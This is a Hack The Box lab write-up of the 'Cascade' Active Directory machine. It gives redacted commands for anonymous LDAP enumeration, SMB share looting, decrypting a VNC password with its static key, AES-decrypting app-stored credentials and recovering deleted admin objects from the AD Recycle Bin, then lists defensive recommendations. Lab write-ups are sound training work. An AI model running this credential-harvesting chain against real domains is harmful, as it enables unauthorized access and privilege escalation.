---
title: "Cascade: LDAP, SMB, and Recycle Bin Credential Exposure"
description: "Anonymous LDAP disclosure, SMB configuration artifacts, audit-app analysis, and AD Recycle Bin data combine into a credential-exposure chain."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ldap
---

## Summary

Cascade is an HTB Active Directory lab where anonymous LDAP disclosure, SMB-accessible configuration artifacts, static analysis of a custom audit application, and AD Recycle Bin data formed a credential-exposure chain. Target names, passwords, keys, encrypted values, hashes, and flags are redacted.

## Context and Objective

The recorded target was a Windows Server 2008 R2 domain controller exposing DNS, Kerberos, LDAP, SMB, and RPC. The notes attribute anonymous LDAP access to legacy pre-Windows-2000 compatibility configuration. Objective: enumerate exposed domain data, validate resulting account access, and determine whether available permissions led to administrative access.

## Approach and Evidence

### Enumerate LDAP and decode custom attribute

Anonymous LDAP enumeration returned user objects. A non-standard credential-like attribute on one object contained a Base64 value; decoding it produced a password that the notes validated against SMB.

```bash
ldapsearch -x -H ldap://<TARGET_IP> -b "DC=<DOMAIN_PART>,DC=<TLD>" \
  "(objectClass=user)" > ldap_users.txt
base64 -d <<< '<ENCODED_LEGACY_PASSWORD>'
nxc smb <DOMAIN> -u '<LDAP_USER>' -p '<LDAP_PASSWORD>'
```

```text
... custom legacy-password attribute present ...
[+] <DOMAIN>\<LDAP_USER>:<LDAP_PASSWORD>
```

### Traverse SMB shares and VNC configuration

The validated account could read the `Data` share. Its contents included a VNC installation registry export containing an encrypted password value. The notes decoded it with VNC's documented static DES key and validated a second account over SMB.

```bash
smbclient //<TARGET_IP>/Data -U '<LDAP_USER>%<LDAP_PASSWORD>' \
  -c 'recurse ON; prompt OFF; mget *'
printf '%s' '<VNC_HEX_VALUE>' | xxd -r -p | \
  openssl enc -des-cbc --nopad --nosalt -K <VNC_STATIC_KEY> \
  -iv <ZERO_IV> -d | hexdump -Cv
```

```text
IT/Temp/<USER>/VNC Install.reg
... decoded credential validated for SMB ...
```

### Recover service credentials from audit application

The second account could read `Audit$`, which contained a .NET audit executable, its crypto library, and SQLite database. Static review of the executable and library showed an AES-CBC encrypted service-account value and hard-coded key and IV. The notes used those values to recover and validate service-account credentials.

```bash
sqlite3 Audit.db "SELECT * FROM Ldap;"
```

```text
... service account ...
... Base64-encoded encrypted value ...
```

```python
# Representative analysis pattern; original key, IV, and ciphertext redacted.
from Crypto.Cipher import AES
import base64

cipher = AES.new(b"<AES_KEY>", AES.MODE_CBC, b"<AES_IV>")
plaintext = cipher.decrypt(base64.b64decode("<CIPHERTEXT>"))
```

The notes report successful WinRM access as that service account.

### Query deleted accounts through AD Recycle Bin

The service account belonged to the AD Recycle Bin group. A log in the Data share identified deleted accounts, and a deleted temporary-administrator object retained the same custom legacy-password attribute. The notes state that supporting records established password reuse with the current domain Administrator, then report validated administrative access.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' \
  -IncludeDeletedObjects -Property * |
  Select sAMAccountName, cascadeLegacyPwd
```

```text
sAMAccountName: <DELETED_TEMP_ADMIN>
cascadeLegacyPwd: <ENCODED_LEGACY_PASSWORD>
```

```bash
base64 -d <<< '<ENCODED_LEGACY_PASSWORD>'
nxc smb <DOMAIN> -u 'administrator' -p '<RECOVERED_PASSWORD>'
```

```text
... administrator credentials validated ...
```

## Outcome

The recorded evidence establishes a credential chain from anonymous LDAP access, through readable SMB artifacts and reversible application-stored encryption, to sensitive data retained on a deleted AD object. The notes report administrative access after validating the recovered password. All credential-bearing values are omitted.

## Lessons and Recommendations

- Disable anonymous LDAP enumeration and retire legacy compatibility settings that permit it.
- Never store credentials in custom LDAP attributes or VNC configuration exports.
- Remove hard-coded cryptographic keys from applications and use managed secret storage.
- Clear sensitive attributes before account deletion; review and purge Recycle Bin entries where recovery needs allow.
- Rotate privileged credentials when temporary administrative accounts are retired.

## References

- Hack The Box, [Cascade](https://app.hackthebox.com/machines/Cascade) lab.
